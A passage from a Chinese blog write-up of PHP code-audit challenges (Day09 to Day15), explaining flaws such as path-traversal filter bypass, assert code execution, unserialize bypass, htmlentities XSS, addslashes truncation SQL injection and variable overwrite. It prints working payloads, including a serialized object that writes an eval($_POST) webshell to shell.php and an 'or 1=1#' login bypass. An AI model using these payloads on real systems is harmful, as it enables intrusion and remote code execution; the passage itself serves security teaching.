+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/24.png" srcset="/img/loading.gif"></p>
+<p>但是通过上传提交却失败了，通过debug，我们可以发现<code>.</code>被替换成了<code>_</code>，这是因为php自动将非法字符替换成了下划线。可以用通用字符。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/25.png" srcset="/img/loading.gif"></p>
+<p>payload:</p>
+<p><code>?\S*=&#123;$&#123;phpinfo()&#125;&#125;</code></p>
+<h3 id="9-Day09-str-replace函数过滤不当"><a href="#9-Day09-str-replace函数过滤不当" class="headerlink" title="9.Day09( str_replace函数过滤不当)"></a>9.Day09( str_replace函数过滤不当)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/26.png" srcset="/img/loading.gif"></p>
+<p>这一关比较简单，在图中代码21行，只对<code>../</code>进行一次替换为空的操作，所以双写就可以绕过了。</p>
+<p>修改请求头为以下payload:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Accept-Language: ...<span class="hljs-regexp">/./</span>...<span class="hljs-regexp">/./</span>demo.txt<br></code></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="10-Day10-程序未恰当exit导致的问题"><a href="#10-Day10-程序未恰当exit导致的问题" class="headerlink" title="10.Day10(程序未恰当exit导致的问题)"></a>10.Day10(程序未恰当exit导致的问题)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/27.png" srcset="/img/loading.gif"></p>
+<p>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第7行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.extract.php">extract </a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p>
+<p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code></p>
+</blockquote>
+<p>通过extract函数，我们可以控制<code>$pi</code>，当程序判断我们的<code>$pi</code>变量有问题的时候，没有直接退出，也就到了 <strong>第18行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong> 变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p>
+<p>payload:<code>pi=phpinfo()</code></p>
+<p>但是我们是无法在游览器端看到phpinfo的页面，可以通过burp进行查看。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/28.png" srcset="/img/loading.gif"></p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/29.png" srcset="/img/loading.gif"></p>
+<h3 id="11-Day11-unserialize反序列化漏洞"><a href="#11-Day11-unserialize反序列化漏洞" class="headerlink" title="11.Day11 - unserialize反序列化漏洞"></a>11.Day11 - unserialize反序列化漏洞</h3><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a target="_blank" rel="noopener" href="https://www.phpbug.cn/archives/32.html">https://www.phpbug.cn/archives/32.html</a></p>
+<h4 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cacheFile</span> = <span class="hljs-string">&#x27;/tmp/cachefile&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$template</span> = <span class="hljs-string">&#x27;&lt;div&gt;Welcome back %s&lt;/div&gt;&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;loadData(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">$this</span>-&gt;render(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadData</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) !== <span class="hljs-string">&#x27;O:&#x27;</span><br>        &amp;&amp; !preg_match(<span class="hljs-string">&#x27;/O:\d:/&#x27;</span>, <span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> unserialize(<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> [];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createCache</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$tpl</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$file</span> ?? <span class="hljs-keyword">$this</span>-&gt;cacheFile;<br>        <span class="hljs-variable">$tpl</span> = <span class="hljs-variable">$tpl</span> ?? <span class="hljs-keyword">$this</span>-&gt;template;<br>        file_put_contents(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$tpl</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> sprintf(<br>            <span class="hljs-keyword">$this</span>-&gt;template,<br>            htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        );<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;createCache();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">new</span> Template(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure>
+<p>​    这一题的漏洞点在于利用14行中的<code>loadData()</code>方法中的<code>unserialize()</code>函数，利用该函数实施反序列化漏洞调用<code>createCache()</code>方法中的<code>file_put_contents()</code>写入webshell。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/30.png" srcset="/img/loading.gif"></p>
+<p>1.首先我们来确定unserialize()方法反序列化的$data是否可控。</p>
+<p><code>$_COOKIE[&#39;data&#39;]</code>-&gt;<code>__construct($data)</code>-&gt;loadData($data)-&gt;unserialize($data)。</p>
+<p>可以看出是可控的。</p>
+<p>2.再者，我们需要绕过以下防御语句。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>) !== <span class="hljs-string">&#x27;O:&#x27;</span>&amp;&amp; !preg_match(<span class="hljs-string">&#x27;/O:\d:/&#x27;</span>, <span class="hljs-variable">$data</span>))<br></code></pre></td></tr></table></figure>
+<p>第一个if，截取前两个字符，判断反序列化内容是否为对象，如果为对象，返回为空。php可反序列化类型有String,Integer,Boolean,Null,Array,Object。去除掉Object后，考虑采用数组中存储对象进行绕过。</p>
+<p>第二个if判断,匹配 字符串为 <code>O:任意十进制:</code>,将对象放入数组进行反序列化后，仍然能够匹配到，返回为空。</p>
+<p>这里需要利用到一个<a target="_blank" rel="noopener" href="https://www.phpbug.cn/archives/32.html">小特性</a></p>
+<p><strong>在对象前加一个<code>+</code>号，即<code>O:任意十进制-&gt;O:+任意十进制</code>，这样就可以绕过正则匹配。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cacheFile</span> = <span class="hljs-string">&#x27;./shell.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$template</span> = <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;reader&quot;]);?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$temp</span>[] = <span class="hljs-keyword">new</span> Template();<br><span class="hljs-variable">$temp</span> = serialize(<span class="hljs-variable">$temp</span>);<br>var_dump(<span class="hljs-variable">$temp</span>);<br></code></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:1</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">O</span>:+<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Template&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;cacheFile&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;./shell.php&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;template&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;&lt;?php @eval($_POST[&quot;</span>reader<span class="hljs-string">&quot;]);?&gt;&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="12-Day12-误用htmlentities函数引发的漏洞"><a href="#12-Day12-误用htmlentities函数引发的漏洞" class="headerlink" title="12.Day12 - 误用htmlentities函数引发的漏洞"></a>12.Day12 - 误用htmlentities函数引发的漏洞</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/31.png" srcset="/img/loading.gif"></p>
+<p>1.这里考察的是个 <code>xss漏洞</code>， 漏洞触发点在代码中的 第14-15行 。这两行代码的作用是直接输出一个html的 <code>&lt;a&gt;</code> 标签。</p>
+<p>2.代码中的 第4-6行 ，<code>foreach</code>循环 对 <code>$_GET</code> 传入的参数进行了处理，但是这里有个问题。我们看下 第5行的代码，这行代码针对 <code>$valu</code>e进行类型转换，强制变成int类型。但是这部分代码只处理了 $value 变量，没针对 $key 变量进行处理。</p>
+<p>3.经过了 第4-6行 的代码处理之后，根据 <code>&amp;</code>这个符号进行分割，然后拼接到 第14行的 <code>echo</code>语句中，在输出的时候又进行了一次 ～ 函数处理。 <code>htmlentities</code> 函数主要是会对一些特殊符号进行HTML实体编码。具体定义如下：</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.htmlentities.php">https://www.php.net/manual/zh/function.htmlentities.php</a></p>
+<blockquote>
+<h1 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities"></a>htmlentities</h1><p>(PHP 4, PHP 5, PHP 7)</p>
+<p>htmlentities — 将字符转换为 HTML 转义字符</p>
+<h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>htmlentities ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string <code>$encoding</code> = ini_get(“default_charset”) [, bool <code>$double_encode</code> = true ]]] ) : string</p>
+<p>本函数各方面都和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.htmlspecialchars.php">htmlspecialchars()</a> 一样， 除了 <strong>htmlentities()</strong> 会转换所有具有 HTML 实体的字符。</p>
+<p>如果要解码（反向操作），可以使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.html-entity-decode.php">html_entity_decode()</a>。</p>
+<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure>
+
+<p>输入字符。</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">flags</span><br></code></pre></td></tr></table></figure>
+
+<p>以下一组位掩码标记，用于设置如何处理引号、无效代码序列、使用文档的类型。 默认是 <em>ENT_COMPAT | ENT_HTML401</em>。</p>
+<table>
+<thead>
+<tr>
+<th align="left">常量名</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>ENT_COMPAT</code></strong></td>
+<td align="left">会转换双引号，不转换单引号。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_QUOTES</code></strong></td>
+<td align="left">既转换双引号也转换单引号。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_NOQUOTES</code></strong></td>
+<td align="left">单/双引号都不转换</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_IGNORE</code></strong></td>
+<td align="left">静默丢弃无效的代码单元序列，而不是返回空字符串。 不建议使用此标记， 因为它<a target="_blank" rel="noopener" href="http://unicode.org/reports/tr36/#Deletion_of_Noncharacters">» 可能有安全影响</a>。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_SUBSTITUTE</code></strong></td>
+<td align="left">替换无效的代码单元序列为 Unicode 代替符（Replacement Character）， U+FFFD (UTF-8) 或者 &#xFFFD; (其他)，而不是返回空字符串。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_DISALLOWED</code></strong></td>
+<td align="left">为文档的无效代码点替换为 Unicode 代替符（Replacement Character）： U+FFFD (UTF-8)，或 &#xFFFD;（其他），而不是把它们留在原处。 比如以下情况下就很有用：要保证 XML 文档嵌入额外内容时格式合法。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_HTML401</code></strong></td>
+<td align="left">以 HTML 4.01 处理代码。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_XML1</code></strong></td>
+<td align="left">以 XML 1 处理代码。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_XHTML</code></strong></td>
+<td align="left">以 XHTML 处理代码。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>ENT_HTML5</code></strong></td>
+<td align="left">以 HTML 5 处理代码。</td>
+</tr>
+</tbody></table>
+</blockquote>
+<p>查看以上的定义，我们能够发现<code>htmlentities</code>函数默认是 <em>ENT_COMPAT | ENT_HTML401</em>。所以会转换双引号，不转换单引号，这样我们就可以逃逸单引号了。</p>
+<p>在 <code>&lt;a&gt;</code> 中，我们可以通过 <strong>javascript</strong> 事件来执行js代码，例如： <strong>onclick</strong> 这类事件，因此最后的poc构造如下：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?a&#x27;onclick<span class="hljs-variable">%3</span>dalert(<span class="hljs-number">233</span>)//<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/32.png" srcset="/img/loading.gif"></p>
+<h3 id="13-Day13-特定场合下addslashes函数的绕过"><a href="#13-Day13-特定场合下addslashes函数的绕过" class="headerlink" title="13.Day13 -特定场合下addslashes函数的绕过"></a>13.Day13 -特定场合下addslashes函数的绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;bootstrap.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span> == <span class="hljs-literal">false</span>)&#123;<br>	show_source(<span class="hljs-keyword">__FILE__</span>);<br>	<span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginManager</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$em</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();<br>        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValid</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$user</span> = <span class="hljs-keyword">$this</span>-&gt;sanitizeInput(<span class="hljs-keyword">$this</span>-&gt;user);<br>        <span class="hljs-variable">$pass</span> = <span class="hljs-keyword">$this</span>-&gt;sanitizeInput(<span class="hljs-keyword">$this</span>-&gt;password);<br><br>        <span class="hljs-variable">$queryBuilder</span> = <span class="hljs-keyword">$this</span>-&gt;em-&gt;createQueryBuilder()<br>            -&gt;select(<span class="hljs-string">&#x27;COUNT(u)&#x27;</span>)<br>            -&gt;from(<span class="hljs-string">&quot;User&quot;</span>, <span class="hljs-string">&quot;u&quot;</span>)<br>            -&gt;where(<span class="hljs-string">&quot;u.user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND u.password = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>);<br>        <span class="hljs-variable">$query</span> = <span class="hljs-variable">$queryBuilder</span>-&gt;getQuery();<br>        <span class="hljs-keyword">return</span> boolval(<span class="hljs-variable">$query</span>-&gt;getSingleScalarResult());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitizeInput</span>(<span class="hljs-params"><span class="hljs-variable">$input</span>, <span class="hljs-variable">$length</span> = <span class="hljs-number">20</span></span>) </span>&#123;<br>        <span class="hljs-variable">$input</span> = addslashes(<span class="hljs-variable">$input</span>);<br>        <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$input</span>) &gt; <span class="hljs-variable">$length</span>) &#123;<br>            <span class="hljs-variable">$input</span> = substr(<span class="hljs-variable">$input</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$length</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$auth</span> = <span class="hljs-keyword">new</span> LoginManager(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$auth</span>-&gt;isValid()) &#123;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hello, &#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><br></code></pre></td></tr></table></figure>
+<p>​    这是一道典型的用户登录程序，从代码来看，考察的应该是通过 SQL注入绕过登陆验证。其中<code>isValid()</code>的函数是判断我们传入的user和passwd是否合法并进行sql语句的查询。<code>sanitizeInput()</code>方法通过调用<code>addslashes()</code>对传入的字符串进行处理。一般情况下，我们想绕过<code>addslashes()</code>逃逸特殊字符是不可能的了，但是这一题的漏洞点就在于他使用了strlen()截断了字符串。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$input</span>) &gt; <span class="hljs-variable">$length</span>) &#123;<br>           <span class="hljs-variable">$input</span> = substr(<span class="hljs-variable">$input</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$length</span>);<br>       &#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/33.png" srcset="/img/loading.gif"></p>
+<p>并且他最后返回的是截断过后的字符串。我们可以利用他来将<code>addslashes()</code>生成的<code>\</code>进行利用，让他转义<code>isValid()</code>方法中的sql查询语句中的<code>&#39;</code>。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/34.png" srcset="/img/loading.gif"></p>
+<p>poc</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">user</span>=1234567890123456789&#x27;&amp;passwd=or <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/35.png" srcset="/img/loading.gif"></p>
+<h3 id="14-Day14-从变量覆盖到getshell"><a href="#14-Day14-从变量覆盖到getshell" class="headerlink" title="14.Day14 -从变量覆盖到getshell"></a>14.Day14 -从变量覆盖到getshell</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/36.png" srcset="/img/loading.gif"></p>
+<blockquote>
+<p>​    这道题目讲的是一个 <strong>变量覆盖</strong> 与 <strong>路径穿越</strong> 问题。在 <strong>第11-12行</strong> 处， <strong>Carrot</strong> 类的构造方法将超全局数组 <strong>$_GET</strong> 进行变量注册，这样即可覆盖 <strong>第9行</strong> 已定义的 <strong>$this-&gt;</strong> 变量。而在 <strong>第17行</strong> 处的析构函数中， <strong>file_put_contents</strong> 函数的第一个参数又是由 <strong>$this-&gt;</strong> 变量拼接的，这就导致我们可以控制写入文件的位置，最终造成任意文件写入问题。</p>
+</blockquote>
+<p>payload：<code>id=../var/www/html/Shenji/shell.php&amp;shell=&#39;,)%0a&lt;?php phpinfo() ?&gt;//</code>写入 <strong>webshell</strong> </p>
+<p><strong>网摘图。</strong></p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/37.png" srcset="/img/loading.gif"></p>
+<h3 id="15-Day15-SERVER-‘PHP-SELF’-导致的防御失效问题"><a href="#15-Day15-SERVER-‘PHP-SELF’-导致的防御失效问题" class="headerlink" title="15.Day15 -$_SERVER[‘PHP_SELF’]导致的防御失效问题"></a>15.Day15 -$_SERVER[‘PHP_SELF’]导致的防御失效问题</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/38.png" srcset="/img/loading.gif"></p>
+<p>代码分析：</p>
+<p>1.如果<code>$_GET[&#39;redirect&#39;]</code>有值的话，就new 一个<code>Redirect</code>对象，并且调用该对象的<code>startRedirect()</code>方法，并将<code>$_GET[&#39;params&#39;]</code>的值传入。</p>
+<p>2.通过<code>explode</code>函数以<code>/</code>为分割<code>$_SERVER[&#39;PHP_SELF&#39;]</code>成<code>$parts</code>数组，并将该数组的最后一个元素赋值给<code>$baseFile</code>。</p>
+<blockquote>
+<p><strong>$_SERVER[‘PHP’]</strong> 存在的问题：</p>
+<p>初看这个程序没什么问题，但是PHP自带的**$_SERVER[‘PHP_SELF’]** 参数是可以控制的。其中 <strong>PHP_SELF</strong> 指当前的页面绝对地址，比如我们的网站：<strong><a target="_blank" rel="noopener" href="http://www.test.com/redict/index.php">http://www.test.com/redict/index.php</a></strong>，那么<strong>PHP_SELF</strong> 就是 <strong>/redict/index.php</strong> 。但有个小问题很多人没有注意到，当<strong>URL</strong>是<strong>PATH_INFO</strong>的时候，比如：<strong><a target="_blank" rel="noopener" href="http://www.test.com/redict/index.php/admin">http://www.test.com/redict/index.php/admin</a></strong>，那么<strong>PHP_SELF</strong>就是**/redict/index.php/admin** 也就是说，其实 <strong>PHP_SELF</strong> 有一部分是我们可以控制的。</p>
+</blockquote>
+<p>3.通过<code>sprintf()</code>函数将$baseFile和<code>http_build_query($params)</code>得到的值，赋值给<code>$url</code>。其中的 <strong>http_build_query()</strong> 函数就是一个将参数进行URL编码的一个操作，比如 <strong>$params=’test=123’</strong></p>
+<blockquote>
+<h1 id="http-build-query"><a href="#http-build-query" class="headerlink" title="http_build_query"></a>http_build_query</h1><p>(PHP 5, PHP 7)</p>
+<p>http_build_query — 生成 URL-encode 之后的请求字符串</p>
+<h3 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h3><p>http_build_query ( <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$query_data</code> [, string <code>$numeric_prefix</code> [, string <code>$arg_separator</code> [, int <code>$enc_type</code> = <strong><code>PHP_QUERY_RFC1738</code></strong> ]]] ) : string</p>
